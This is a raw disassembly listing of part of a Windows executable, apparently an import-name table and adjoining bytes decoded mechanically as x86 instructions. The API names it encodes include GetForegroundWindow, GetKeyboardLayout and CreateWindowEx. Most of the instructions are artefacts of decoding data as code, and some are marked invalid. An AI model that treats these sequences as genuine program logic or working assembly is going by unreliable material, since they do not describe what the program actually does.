  428d75:	jne    0x428ddd
  428d77:	push   di
  428d79:	add    BYTE PTR [eax],al
  428d7b:	mov    esi,0x756f6d02
  428d80:	jae    0x428de7
  428d82:	pop    edi
  428d83:	gs jbe 0x428deb
  428d86:	outs   dx,BYTE PTR ds:[esi]
  428d87:	je     0x428d89
  428d89:	mov    bl,0x0
  428d8b:	inc    esp
  428d8c:	jb     0x428def
  428d8e:	ja     0x428dd9
  428d90:	arpl   WORD PTR [edi+0x6e],bp
  428d93:	add    BYTE PTR [eax],al
  428d95:	adc    al,BYTE PTR [edx]
  428d97:	push   edx
  428d98:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  428da1:	outs   dx,BYTE PTR ds:[esi]
  428da2:	outs   dx,DWORD PTR fs:[esi]
  428da4:	ja     0x428df3
  428da6:	gs jae 0x428e1c
  428da9:	popa   
  428daa:	addr16 gs inc ecx
  428dad:	add    BYTE PTR [eax],al
  428daf:	daa    
  428db0:	add    DWORD PTR [edi+0x65],eax
  428db3:	je     0x428e00
  428db5:	gs jns 0x428e1a
  428db8:	outs   dx,DWORD PTR ds:[esi]
  428db9:	popa   
  428dba:	jb     0x428e20
  428dbc:	push   esp
  428dbd:	jns    0x428e2f
  428dbf:	add    BYTE PTR gs:[edi+0x66654400],cl
  428dc6:	push   edi
  428dc7:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  428dce:	outs   dx,DWORD PTR ds:[esi]
  428dcf:	arpl   WORD PTR [edi+0x0],dx
  428dd2:	add    BYTE PTR [eax+0x536e4901],al
  428dd8:	outs   dx,BYTE PTR gs:[esi]
  428dda:	fs dec ebp
  428ddc:	gs jae 0x428e52
  428ddf:	popa   
  428de0:	add    BYTE PTR gs:[bp+di],dh
  428de4:	add    DWORD PTR [edi+0x65],eax
  428de7:	je     0x428e36
  428de9:	outs   dx,BYTE PTR gs:[esi]
  428deb:	jne    0x428e36
  428ded:	je     0x428e54
  428def:	ins    DWORD PTR es:[edi],dx
  428df0:	dec    ecx
  428df1:	inc    esp
  428df2:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  428df9:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x73490190
  428e01:	inc    ebx
  428e02:	push   0x6f4c7261
  428e07:	ja     0x428e6e
  428e09:	jb     0x428e4c
  428e0b:	add    BYTE PTR [eax],al
  428e0d:	jmp    0x74a7d512
  428e12:	inc    ecx
  428e13:	arpl   WORD PTR [ecx+ebp*2+0x76],si
  428e17:	gs push edi
  428e19:	imul   ebp,DWORD PTR [esi+0x64],0x3a00776f
  428e20:	add    dl,BYTE PTR [ebx+0x65]
  428e23:	je     0x428e68
  428e25:	jne    0x428e99
  428e27:	jae    0x428e98
  428e29:	jb     0x428e7b
  428e2b:	outs   dx,DWORD PTR ds:[esi]
  428e2c:	jae    0x428e2e
  428e2e:	add    BYTE PTR ds:0x74654701,dl
  428e34:	inc    esi
  428e35:	outs   dx,DWORD PTR ds:[esi]
  428e36:	jb     0x428e9d
  428e38:	addr16 jb 0x428eaa
  428e3b:	jne    0x428eab
  428e3d:	fs push edi
  428e3f:	imul   ebp,DWORD PTR [esi+0x64],0x2300776f
  428e46:	add    DWORD PTR [edi+0x65],eax
  428e49:	je     0x428e96
  428e4b:	gs jns 0x428eb0
  428e4e:	outs   dx,DWORD PTR ds:[esi]
  428e4f:	popa   
  428e50:	jb     0x428eb6
  428e52:	dec    esp
  428e53:	popa   
  428e54:	jns    0x428ec5
  428e56:	jne    0x428ecc
  428e58:	dec    esp
  428e59:	imul   esi,DWORD PTR [ebx+0x74],0x43006300
  428e60:	jb     0x428ec7
  428e62:	popa   
  428e63:	je     0x428eca
  428e65:	push   edi
  428e66:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428e6d:	push   edi
  428e6e:	add    BYTE PTR [edx+0x766e4901],cl
  428e74:	popa   
  428e75:	ins    BYTE PTR es:[edi],dx
  428e76:	imul   esp,DWORD PTR [ecx+eiz*2+0x74],0x6e675265
  428e7e:	add    BYTE PTR [eax],bh
  428e80:	add    BYTE PTR [ebx+0x68],al
  428e83:	popa   
  428e84:	jb     0x428edb
  428e86:	jo     0x428ef8
  428e88:	gs jb  0x428ecd
  428e8b:	jne    0x428ef3
  428e8d:	push   di
  428e8f:	add    BYTE PTR [eax],al
  428e91:	mov    al,BYTE PTR [edx]
  428e93:	push   esp
  428e94:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x6f646e69
  428e9c:	ja     0x428f11
  428e9e:	add    dh,dh
  428ea0:	add    BYTE PTR [edi+0x65],al
  428ea3:	je     0x428ee8
  428ea5:	ins    BYTE PTR es:[edi],dx
  428ea6:	popa   
  428ea7:	jae    0x428f1c
  428ea9:	dec    ecx
  428eaa:	outs   dx,BYTE PTR ds:[esi]
  428eab:	outs   dx,WORD PTR ds:[esi]
  428ead:	inc    ebp
  428eae:	js     0x428f07
  428eb0:	add    BYTE PTR [esi+0x736e4901],al
  428eb6:	gs jb  0x428f2d
  428eb9:	dec    ebp
  428eba:	outs   dx,BYTE PTR gs:[esi]
  428ebc:	jne    0x428f15
  428ebe:	add    BYTE PTR [eax],bh
  428ec0:	add    DWORD PTR [edi+0x65],eax
  428ec3:	je     0x428f12
  428ec5:	outs   dx,BYTE PTR gs:[esi]
  428ec7:	jne    0x428f1c
  428ec9:	je     0x428f3d
  428ecb:	imul   ebp,DWORD PTR [esi+0x67],0x11000041
  428ed2:	add    DWORD PTR [edi+0x65],eax
  428ed5:	je     0x428f1b
  428ed7:	ins    BYTE PTR es:[edi],dx
  428ed8:	addr16 dec ecx
  428eda:	je     0x428f41
  428edc:	ins    DWORD PTR es:[edi],dx
  428edd:	push   esp
  428ede:	gs js  0x428f55
  428ee1:	inc    ecx
  428ee2:	add    BYTE PTR [eax+0x44734901],bl
  428ee8:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428eef:	jae    0x428f64
  428ef1:	popa   
  428ef2:	addr16 gs push edi
  428ef5:	add    BYTE PTR [eax],al
  428ef7:	mov    al,ds:0x73694400
  428efc:	jo     0x428f5f
  428efe:	je     0x428f63
  428f00:	push   0x7373654d
  428f05:	popa   
  428f06:	addr16 gs push edi
  428f09:	add    BYTE PTR [eax],al
  428f0b:	js     0x428f0e
  428f0d:	inc    edi
  428f0e:	gs je  0x428f68
  428f11:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  428f18:	js     0x428f8e
  428f1a:	push   edi
  428f1b:	add    BYTE PTR [eax],al
  428f1d:	sub    eax,0x6e655302
  428f22:	fs dec esi
  428f24:	outs   dx,DWORD PTR ds:[esi]
  428f25:	je     0x428f90
  428f27:	data16 jns 0x428f77
  428f2a:	gs jae 0x428fa0
  428f2d:	popa   
  428f2e:	addr16 gs push edi
  428f31:	add    BYTE PTR [eax],al
  428f33:	and    BYTE PTR [edx],al
  428f35:	push   ebx
  428f36:	arpl   WORD PTR [edx+0x6f],si
  428f39:	ins    BYTE PTR es:[edi],dx
  428f3a:	ins    BYTE PTR es:[edi],dx
  428f3b:	push   edi
  428f3c:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  428f43:	add    BYTE PTR [eax],al
  428f45:	add    WORD PTR [edi+0x65],ax
  428f49:	je     0x428fa0
  428f4b:	jae    0x428fb2
  428f4d:	jb     0x428f9e
  428f4f:	bound  ebp,QWORD PTR [edx+0x65]
  428f52:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  428f56:	outs   dx,WORD PTR ds:[esi]
  428f58:	jb     0x428fc7
  428f5a:	popa   
  428f5b:	je     0x428fc6
  428f5d:	outs   dx,DWORD PTR ds:[esi]
  428f5e:	outs   dx,BYTE PTR ds:[esi]
  428f5f:	push   edi
  428f60:	add    ch,dh
  428f62:	add    DWORD PTR [eax+0x6f],edx
  428f65:	jae    0x428fdb
  428f67:	push   esp
  428f68:	push   0x64616572
  428f6d:	dec    ebp
  428f6e:	gs jae 0x428fe4
  428f71:	popa   
  428f72:	addr16 gs push edi
  428f75:	add    BYTE PTR [eax],al
  428f77:	mov    eax,DWORD PTR [ecx]
  428f79:	dec    ecx
  428f7a:	outs   dx,BYTE PTR ds:[esi]
  428f7b:	jbe    0x428fe2
  428f7d:	jb     0x428ff3
  428f7f:	push   edx
  428f80:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  428f85:	xchg   edi,eax
  428f86:	add    DWORD PTR [ecx+0x73],ecx
  428f89:	inc    esp
  428f8a:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  428f91:	jae    0x429006
  428f93:	popa   
  428f94:	addr16 gs inc ecx
  428f97:	add    BYTE PTR [eax],al
  428f99:	mov    ch,0x0
  428f9b:	inc    esp
  428f9c:	jb     0x428fff
  428f9e:	ja     0x428fed
  428fa0:	outs   dx,BYTE PTR gs:[esi]
  428fa2:	jne    0x428fe6
  428fa4:	popa   
  428fa5:	jb     0x428fa7
  428fa7:	push   ebp
  428fa8:	push   ebx
  428fa9:	inc    ebp
  428faa:	push   edx
  428fab:	xor    esi,DWORD PTR [edx]
  428fad:	cs fs ins BYTE PTR es:[edi],dx
  428fb0:	ins    BYTE PTR es:[edi],dx
  428fb1:	add    BYTE PTR [eax],al
  428fb3:	int3   
  428fb4:	add    DWORD PTR [ebx+0x65],edx
  428fb7:	ins    BYTE PTR es:[edi],dx
  428fb8:	arpl   WORD PTR gs:[ebx+eax*2+0x6c],si
  428fbd:	imul   esi,DWORD PTR [eax+0x52],0x88006e67
  428fc4:	add    BYTE PTR [ebx+0x72],al
  428fc7:	gs popa 
  428fc9:	je     0x429030
  428fcb:	inc    edx
  428fcc:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x646e4970
  428fd4:	imul   esi,DWORD PTR [edx+0x65],0x7463
  428fdb:	rol    BYTE PTR [eax],0x45
  428fde:	outs   dx,BYTE PTR ds:[esi]
  428fdf:	fs push eax
  428fe1:	popa   
  428fe2:	je     0x42904c
  428fe4:	add    dh,cl
  428fe6:	add    DWORD PTR [ebx+0x65],edx
  428fe9:	ins    BYTE PTR es:[edi],dx
  428fea:	arpl   WORD PTR gs:[edi+ecx*2+0x62],si
  428fef:	push   0x65
  428ff1:	arpl   WORD PTR [eax+eax*1+0x0],si
  428ff5:	fiadd  WORD PTR [ecx]
  428ff7:	push   ebx
  428ff8:	gs je  0x42903f
  428ffb:	dec    ecx
  428ffc:	inc    edx
  428ffd:	imul   esi,DWORD PTR [ebx+esi*2+0x54],0x7665446f
  429005:	imul   esp,DWORD PTR [ebx+0x65],0x43009e00
  42900c:	jb     0x429073
  42900e:	popa   
  42900f:	je     0x429076
  429011:	inc    esi
  429012:	outs   dx,DWORD PTR ds:[esi]
  429013:	outs   dx,BYTE PTR ds:[esi]
  429014:	je     0x42906d
  429016:	add    dh,dh
  429018:	add    DWORD PTR [ebx+0x65],edx
  42901b:	je     0x429070
  42901d:	je     0x429091
  42901f:	gs je  0x429085
  429022:	push   0x4d746c42
  429027:	outs   dx,DWORD PTR ds:[esi]
  429028:	fs add BYTE PTR gs:[eax+0x65724300],dh
  429030:	popa   
  429031:	je     0x429098
  429033:	push   ebx
  429034:	outs   dx,DWORD PTR ds:[esi]
  429035:	ins    BYTE PTR es:[edi],dx
  429036:	imul   esp,DWORD PTR [edx+eax*2+0x72],0x687375
  42903e:	add    bh,cl
  429040:	add    DWORD PTR [ebx+0x65],edx
  429043:	ins    BYTE PTR es:[edi],dx
  429044:	arpl   WORD PTR gs:[eax+edx*2+0x61],si
  429049:	ins    BYTE PTR es:[edi],dx
  42904a:	gs je  0x4290c1
  42904d:	add    BYTE PTR gs:[edx+0x63655201],bh
  429054:	je     0x4290ac
  429056:	imul   esi,DWORD PTR [ebx+0x69],0x656c62
  42905d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42905e:	add    DWORD PTR [eax+0x61],edx
  429061:	je     0x4290a5
  429063:	ins    BYTE PTR es:[edi],dx
  429064:	je     0x429066
  429066:	add    BYTE PTR [ebx+0x65724300],dl
  42906c:	popa   
  42906d:	je     0x4290d4
  42906f:	inc    esp
  429070:	dec    ecx
  429071:	inc    edx
  429072:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xdc000070
  42907a:	add    DWORD PTR [ebx+0x65],edx
  42907d:	je     0x4290c3
  42907f:	dec    ecx
  429080:	inc    edx
  429081:	inc    ebx
  429082:	outs   dx,DWORD PTR ds:[esi]
  429083:	ins    BYTE PTR es:[edi],dx
  429084:	outs   dx,DWORD PTR ds:[esi]
  429085:	jb     0x4290db
  429087:	popa   
  429088:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  42908c:	add    BYTE PTR [eax+0x1],al
  42908f:	inc    edi
  429090:	gs je  0x4290d7
  429093:	dec    ecx
  429094:	inc    edx
  429095:	imul   esi,DWORD PTR [ebx+esi*2+0x0],0x655201c1
  42909d:	ins    DWORD PTR es:[edi],dx
  42909e:	outs   dx,DWORD PTR ds:[esi]
  42909f:	jbe    0x429106
  4290a1:	inc    esi
  4290a2:	outs   dx,DWORD PTR ds:[esi]
  4290a3:	outs   dx,BYTE PTR ds:[esi]
  4290a4:	je     0x4290f8
  4290a6:	gs jae 0x429118
  4290a9:	jne    0x42911d
  4290ab:	arpl   WORD PTR [ebp+0x57],sp
  4290ae:	add    ah,bh
  4290b0:	add    DWORD PTR [ebx+0x65],edx
  4290b3:	je     0x42910b
  4290b5:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  4290bc:	inc    ebp
  4290bd:	js     0x429133
  4290bf:	inc    ebp
  4290c0:	js     0x4290c2
  4290c2:	add    BYTE PTR [esi],dh
  4290c4:	add    DWORD PTR [edi+0x65],eax
  4290c7:	je     0x42910c
  4290c9:	ins    BYTE PTR es:[edi],dx
  4290ca:	imul   esi,DWORD PTR [eax+0x42],0x786f
  4290d1:	cmp    al,BYTE PTR [ecx]
  4290d3:	inc    edi
  4290d4:	gs je  0x42911a
  4290d7:	jne    0x42914b
  4290d9:	jb     0x429140
  4290db:	outs   dx,BYTE PTR ds:[esi]
  4290dc:	je     0x42912d
  4290de:	bound  ebp,QWORD PTR [edx+0x65]
  4290e1:	arpl   WORD PTR [eax+eax*1+0x0],si
  4290e5:	xchg   edx,eax
  4290e6:	add    BYTE PTR [ebx+0x72],al
  4290e9:	gs popa 
  4290eb:	je     0x429152
  4290ed:	inc    esp
  4290ee:	dec    ecx
  4290ef:	inc    edx
  4290f0:	push   ebx
  4290f1:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  4290f6:	outs   dx,BYTE PTR ds:[esi]
  4290f7:	add    BYTE PTR [eax],al
  4290f9:	out    0x1,al
  4290fb:	push   ebx
  4290fc:	gs je  0x42914b
  4290ff:	popa   
  429100:	jns    0x429171
  429102:	jne    0x429178
  429104:	add    BYTE PTR ds:0x61745302,al
  42910a:	jb     0x429180
  42910c:	push   eax
  42910d:	popa   
  42910e:	add    BYTE PTR gs:[bx+di+0x4f01],ah
  429114:	data16 data16 jae 0x42917d
  429118:	je     0x429170
  42911a:	imul   esp,DWORD PTR [ebp+0x77],0x74726f70
  429121:	dec    edi
  429122:	jb     0x42918b
  429124:	inc    ebp
  429125:	js     0x429127
  429127:	add    DWORD PTR [bx+0x65],eax
  42912b:	je     0x42917c
  42912d:	bound  ebp,QWORD PTR [edx+0x65]
  429130:	arpl   WORD PTR [ecx+eax*2+0x0],si
  429134:	add    BYTE PTR [edx+eax*1],dl
  429137:	push   edi
  429138:	imul   esp,DWORD PTR [ebp+eiz*2+0x6e],0x68746150
  429140:	add    BYTE PTR [ecx],al
  429142:	add    dl,BYTE PTR [ebx+0x65]
  429145:	je     0x42919e
  429147:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  42914e:	addr16 inc ebp
  429150:	js     0x429152
  429152:	add    BYTE PTR [edx+0x65724300],bl
  429158:	popa   
  429159:	je     0x4291c0
  42915b:	inc    esi
  42915c:	outs   dx,DWORD PTR ds:[esi]
  42915d:	outs   dx,BYTE PTR ds:[esi]
  42915e:	je     0x4291a9
  429160:	outs   dx,BYTE PTR ds:[esi]
  429161:	imul   esi,DWORD PTR fs:[edx+0x65],0x417463
  429169:	mov    DWORD PTR [eax],0x6d756e45
  42916f:	inc    esi
  429170:	outs   dx,DWORD PTR ds:[esi]
  429171:	outs   dx,BYTE PTR ds:[esi]
  429172:	je     0x4291e7
  429174:	push   edi
  429175:	add    BYTE PTR [eax],al
  429177:	pop    es
  429178:	add    BYTE PTR [ecx+0x64],al
  42917b:	fs inc esi
  42917d:	outs   dx,DWORD PTR ds:[esi]
  42917e:	outs   dx,BYTE PTR ds:[esi]
  42917f:	je     0x4291d3
  429181:	gs jae 0x4291f3
  429184:	jne    0x4291f8
  429186:	arpl   WORD PTR [ebp+0x57],sp
  429189:	add    BYTE PTR [eax],al
  42918b:	xlat   BYTE PTR ds:[ebx]
  42918c:	add    DWORD PTR [ebx+0x65],edx
  42918f:	je     0x4291d3
  429191:	jb     0x429208
  429193:	jae    0x4291fd
  429195:	dec    edi
  429196:	jb     0x4291ff
  429198:	inc    ebp
  429199:	js     0x42919b
  42919b:	mov    ecx,0x63655201
  4291a0:	je     0x4291eb
  4291a2:	outs   dx,BYTE PTR ds:[esi]
  4291a3:	push   edx
  4291a4:	imul   ebp,DWORD PTR gs:[bx+0x6e],0x1e80000
  4291ad:	push   ebx
  4291ae:	gs je  0x4291fe
  4291b1:	popa   
  4291b2:	jo     0x429201
  4291b4:	outs   dx,DWORD PTR ds:[esi]
  4291b5:	fs add BYTE PTR gs:[eax],al
  4291b9:	mov    cl,0x0
  4291bb:	inc    esp
  4291bc:	push   eax
  4291bd:	je     0x42922e
  4291bf:	dec    esp
  4291c0:	push   eax
  4291c1:	add    BYTE PTR [eax],al
  4291c3:	mov    esi,0x646e4500
  4291c8:	inc    esp
  4291c9:	outs   dx,DWORD PTR ds:[esi]
  4291ca:	arpl   WORD PTR [eax],ax
  4291cc:	add    BYTE PTR [edx+0x65724300],ah
  4291d2:	popa   
  4291d3:	je     0x42923a
  4291d5:	dec    ecx
  4291d6:	inc    ebx
  4291d7:	push   edi
  4291d8:	add    BYTE PTR [ebp+0x0],dh
  4291db:	inc    edx
  4291dc:	imul   ebp,DWORD PTR gs:[bp+0x50],0x687461
  4291e5:	xchg   ecx,eax
  4291e6:	add    DWORD PTR [edi+0x65],eax
  4291e9:	je     0x429242
  4291eb:	imul   ebp,DWORD PTR [esi+0x64],0x724f776f
  4291f2:	addr16 inc ebp
  4291f4:	js     0x4291f6
  4291f6:	add    BYTE PTR [esi+0x65724300],ah
  4291fc:	popa   
  4291fd:	je     0x429264
  4291ff:	push   eax
  429200:	popa   
  429201:	je     0x429277
  429203:	gs jb  0x429274
  429206:	inc    edx
  429207:	jb     0x42927e
  429209:	jae    0x429273
  42920b:	add    BYTE PTR [eax],al
  42920d:	xchg   esp,eax
  42920e:	add    BYTE PTR [ebx+0x72],al
  429211:	gs popa 
  429213:	je     0x42927a
  429215:	inc    esp
  429216:	imul   esi,DWORD PTR [ebx+0x63],0x61647261
  42921d:	bound  ebp,QWORD PTR [ebp+eiz*2+0x42]
  429221:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0xab0070
  429229:	inc    ebx
  42922a:	jb     0x429291
  42922c:	popa   
  42922d:	je     0x429294
  42922f:	push   edx
  429230:	arpl   WORD PTR gs:[edx+edx*2+0x67],si
  429235:	outs   dx,BYTE PTR ds:[esi]
  429236:	add    BYTE PTR [eax+eax*1+0x696c6c45],bh
  42923d:	jo     0x4292b2
  42923f:	add    BYTE PTR gs:[ebp+0x65724300],ah
  429246:	popa   
  429247:	je     0x4292ae
  429249:	push   eax
  42924a:	popa   
  42924b:	ins    BYTE PTR es:[edi],dx
  42924c:	gs je  0x4292c3
  42924f:	add    BYTE PTR gs:[edi],cl
  429252:	add    dl,BYTE PTR [ebp+0x6e]
  429255:	jb     0x4292bc
  429257:	popa   
  429258:	ins    BYTE PTR es:[edi],dx
  429259:	imul   edi,DWORD PTR [edx+0x65],0x656a624f
  429260:	arpl   WORD PTR [eax+eax*1-0x2c],si
  429264:	add    BYTE PTR [ebp+0x78],al
  429267:	je     0x4292bd
  429269:	gs js  0x4292e0
  42926c:	dec    edi
  42926d:	jne    0x4292e3
  42926f:	inc    ecx
  429270:	add    BYTE PTR [ecx+0x1],bh
  429273:	inc    edi
  429274:	gs je  0x4292ca
  429277:	jns    0x4292ec
  429279:	je     0x4292e0
  42927b:	ins    DWORD PTR es:[edi],dx
  42927c:	push   eax
  42927d:	popa   
  42927e:	ins    BYTE PTR es:[edi],dx
  42927f:	gs je  0x4292f6
  429282:	gs inc ebp
  429284:	outs   dx,BYTE PTR ds:[esi]
  429285:	je     0x4292f9
  429287:	imul   esp,DWORD PTR [ebp+0x73],0x5201c600
  42928e:	outs   dx,DWORD PTR ds:[esi]
  42928f:	jne    0x4292ff
  429291:	fs push edx
  429293:	arpl   WORD PTR gs:[eax+eax*1+0x47],si
  429298:	inc    esp
  429299:	dec    ecx
  42929a:	xor    esi,DWORD PTR [edx]
  42929c:	cs fs ins BYTE PTR es:[edi],dx
  42929f:	ins    BYTE PTR es:[edi],dx
  4292a0:	add    BYTE PTR [eax+0x6b],ah
  4292a3:	adc    BYTE PTR [eax],al
  4292a5:	mov    dl,0x30
  4292a7:	adc    BYTE PTR [eax],al
  4292a9:	jp     0x429324
  4292ab:	adc    BYTE PTR [eax],al
  4292ad:	adc    al,0x2b
  4292af:	adc    BYTE PTR [eax],al
  4292b1:	in     eax,0x2f
  4292b3:	adc    BYTE PTR [eax],al
  4292b5:	inc    edi
  4292b6:	pop    esp
  4292b7:	adc    BYTE PTR [eax],al
  4292b9:	xchg   edx,eax
  4292ba:	dec    edi
  4292bb:	adc    BYTE PTR [eax],al
  4292bd:	xchg   ecx,eax
  4292be:	push   ecx
  4292bf:	adc    BYTE PTR [eax],al
  4292c1:	or     dl,BYTE PTR [bx+si]
  4292c4:	add    BYTE PTR [ebx+0x70],ah
  4292c7:	adc    BYTE PTR [eax],al
  4292c9:	xchg   esi,eax
  4292ca:	adc    BYTE PTR fs:[eax],al
  4292cd:	mov    dh,0x69
  4292cf:	adc    BYTE PTR [eax],al
  4292d1:	cdq    
  4292d2:	js     0x4292e4
  4292d4:	add    dl,bl
  4292d6:	data16 adc BYTE PTR [eax],al
  4292d9:	inc    edi
  4292da:	sub    dl,BYTE PTR [eax]
  4292dc:	add    BYTE PTR [eax+ebx*2-0x6d5efff0],ah
  4292e3:	inc    edx
  4292e4:	add    BYTE PTR [ebp-0x56ffbd6e],ah
  4292ea:	xchg   edx,eax
  4292eb:	inc    edx
  4292ec:	add    BYTE PTR [ebp-0x4effbd6e],ch
  4292f2:	xchg   edx,eax
  4292f3:	inc    edx
  4292f4:	add    BYTE PTR [ebp-0x46ffbd6e],dh
  4292fa:	xchg   edx,eax
  4292fb:	inc    edx
  4292fc:	add    BYTE PTR [ebp+0x4d004292],bh
  429302:	push   ebp
  429303:	mov    DWORD PTR [ebx-0x7e9d13f8],ecx
  429309:	mov    esp,ebp
  42930b:	or     ah,dh
  42930d:	dec    ebp
  42930e:	add    bh,al
  429310:	add    BYTE PTR [eax],cl
  429312:	add    BYTE PTR [eax],al
  429314:	mov    DWORD PTR [eax],0x40f44545
  42931a:	xor    eax,0x9c8b8500
  42931f:	hlt    
  429320:	clc    
  429321:	retf   
  429322:	(bad)  
  429323:	enter  0x4d45,0xbc
  429327:	mov    esi,DWORD PTR [esp+esi*8]
  42932a:	test   ebx,ecx
  42932c:	pushf  
  42932d:	enter  0x4df8,0x8b
  429331:	mov    DWORD PTR [ebp-0x20],0x890208
  429338:	inc    ebp
  429339:	inc    ebp
  42933a:	cld    
  42933b:	xor    cl,BYTE PTR [ebx-0xb38b300]
  429341:	or     BYTE PTR [ebx+0x0],dl
  429344:	mov    ebx,0x8bd5700
  429349:	call   DWORD PTR [ecx-0x1]
  42934c:	pop    es
  42934d:	mov    ch,0x33
  42934f:	dec    ebx
  429351:	(bad)  
  429352:	mov    eax,0x72009ea4
  429357:	push   DWORD PTR [edx]
  429359:	or     BYTE PTR [eax],al
  42935b:	jmp    0xff89:0x75c84d03
  429362:	dec    ebp
  429363:	loopne 0x429335
  429365:	ror    BYTE PTR [ebx-0xbf5b2bb],cl
  42936b:	add    BYTE PTR [ebx],dh
  42936d:	mov    ecx,ebx
  42936f:	hlt    
  429370:	add    ecx,ebx
  429372:	enter  0x899e,0x32
  429376:	dec    ebp
  429377:	add    ecx,eax
  429379:	mov    DWORD PTR [ebx-0xbb2b2f8],ecx
  42937f:	or     DWORD PTR [ebx-0xb00b29c],0x0
  429386:	xor    ecx,ebx
  429388:	retf   
  429389:	enter  0x4d03,0xc8
  42938d:	mov    DWORD PTR fs:[eax],ebx
  429390:	lea    eax,[eax]
  429392:	push   esp
  429393:	mov    edi,edi
  429395:	fs (bad) 
  429397:	(bad)  
  429398:	dec    DWORD PTR [ebx-0x7aa8cfaa]
  42939e:	push   0xffffffff
  4293a0:	and    bh,bh
  4293a2:	pop    ecx
  4293a3:	inc    eax
  4293a4:	mov    DWORD PTR [ecx-0xb2aff8],ecx
  4293aa:	push   0xffffff8b
  4293ac:	pop    ecx
  4293ad:	cld    
  4293ae:	dec    ebp
  4293af:	lea    ecx,[ecx+0x45ff08ff]
  4293b5:	mov    BYTE PTR [edx+0x1],cl
  4293b8:	add    BYTE PTR [eax],al
  4293ba:	mov    DWORD PTR [ebp+0x8],0x58008d
  4293c1:	dec    DWORD PTR [ebp-0x77]
  4293c4:	xor    esp,DWORD PTR [ebx+eax*1+0x88b8900]
  4293cb:	cld    
  4293cc:	dec    ebp
  4293cd:	jne    0x429402
  4293cf:	lea    eax,[ebx]
  4293d1:	push   eax
  4293d2:	mov    edi,edi
  4293d4:	or     BYTE PTR [ecx+0x54a845],cl
  4293da:	add    al,ch
  4293dc:	(bad)  
  4293dd:	sub    esp,ebp
  4293df:	add    BYTE PTR [eax],al
  4293e1:	rol    BYTE PTR [eax],0x84
  4293e4:	inc    ebp
  4293e5:	add    dh,BYTE PTR [esi+0x0]
  4293e8:	add    BYTE PTR [ebp-0x73],al
  4293eb:	mov    ebp,DWORD PTR [esp+edx*4]
  4293ee:	inc    DWORD PTR [eax]
  4293f0:	lea    ecx,[ebx-0x30074f4]
  4293f6:	call   0x439f7b
  4293fb:	add    BYTE PTR [ebp+0x0],cl
  4293fe:	jne    0x429441
  429400:	dec    DWORD PTR [ebx-0x76210314]
  429406:	dec    ebp
  429407:	add    DWORD PTR [ebp+0x0],esi
  42940a:	(bad)  
  42940b:	xchg   ebp,eax
  42940c:	loopne 0x42940d
  42940e:	inc    eax
  42940f:	inc    DWORD PTR [eax]
  429411:	mov    ecx,DWORD PTR [ebp-0x4]
  429414:	xor    edx,DWORD PTR [edx+0x7201b8]
  42941a:	add    BYTE PTR [edx],dl
  42941c:	enter  0x4d90,0x0
  429420:	mov    eax,DWORD PTR [eax]
  429422:	hlt    
  429423:	add    al,0xa5
  429425:	mov    al,0xff
  429427:	add    bh,bh
  429429:	add    BYTE PTR [ebx],dh
  42942b:	inc    DWORD PTR [ebx]
  42942d:	sbb    al,0x89
  42942f:	jne    0x429409
  429431:	mov    esp,DWORD PTR [ecx+0x4500fc]
  429437:	mov    eax,DWORD PTR [ebp-0xff0048]
  42943d:	mov    DWORD PTR [eax-0x70],0xee58e189
  429444:	inc    DWORD PTR [ebp-0x75]
  429447:	ror    DWORD PTR [esp+ebp*8],1
  42944a:	test   DWORD PTR [esi-0x1],esp
  42944d:	inc    ebp
  42944e:	(bad)  
  42944f:	aas    
  429450:	inc    ebp
  429451:	(bad)  
  429452:	lea    edi,[esp+eiz*2-0x1]
  429456:	push   DWORD PTR [edi]
  429458:	mov    DWORD PTR [ecx],esi
  42945a:	mov    al,ds:0x8b8000c7
  42945f:	out    dx,al
  429460:	cld    
  429461:	call   0xed41d9f3
  429466:	(bad)  
  429467:	fisttp WORD PTR [eax+0x8801c7]
  42946d:	jmp    0x4294b4
  42946f:	out    dx,al
  429470:	inc    DWORD PTR [ebp-0x4]
  429473:	xlat   BYTE PTR ds:[ebx]
  429474:	lea    edi,[edi]
  429476:	inc    edi
  429478:	jmp    FWORD PTR [eax-0x78]
  42947b:	inc    DWORD PTR [ecx]
  42947d:	aaa    
  42947e:	add    BYTE PTR [ecx],dh
  429480:	repnz mov DWORD PTR [eax],0xfff856c
  429487:	ffreep st(5)
  429489:	aas    
  42948a:	add    bh,al
  42948c:	mov    esi,DWORD PTR [eax-0x4]
  42948f:	inc    DWORD PTR [eax+0xdf01ec]
  429495:	(bad)  
  429496:	or     BYTE PTR [ebp+eax*2-0x1],dh
  42949a:	mov    esp,ebx
  42949c:	xchg   esp,eax
  42949d:	rol    DWORD PTR [eax],cl
  42949f:	(bad)  
  4294a0:	mov    edi,DWORD PTR [eax+0x3]
  4294a3:	(bad)  
  4294a4:	cmp    al,0xd7
  4294a6:	dec    ebp
  4294a7:	lds    ecx,FWORD PTR [ebx+0x29d8e8]
  4294ad:	add    BYTE PTR [ebp-0x3b375],cl
  4294b3:	adc    BYTE PTR [edx+0x1],0x55
  4294b7:	add    BYTE PTR [ebx+0x58c30],cl
  4294bd:	add    BYTE PTR [ebx-0x778afc7b],cl
  4294c3:	mov    eax,DWORD PTR [eax]
  4294c5:	cld    
  4294c6:	push   0x7d
  4294c8:	dec    DWORD PTR [ebx+0xd88c]
  4294ce:	push   edx
  4294cf:	mov    edx,DWORD PTR [ecx-0x4]
  4294d2:	call   DWORD PTR [eax+0x7d01fc]
  4294d8:	mov    esp,DWORD PTR [esp+edi*8]
  4294db:	add    BYTE PTR [eax+0x560150],dl
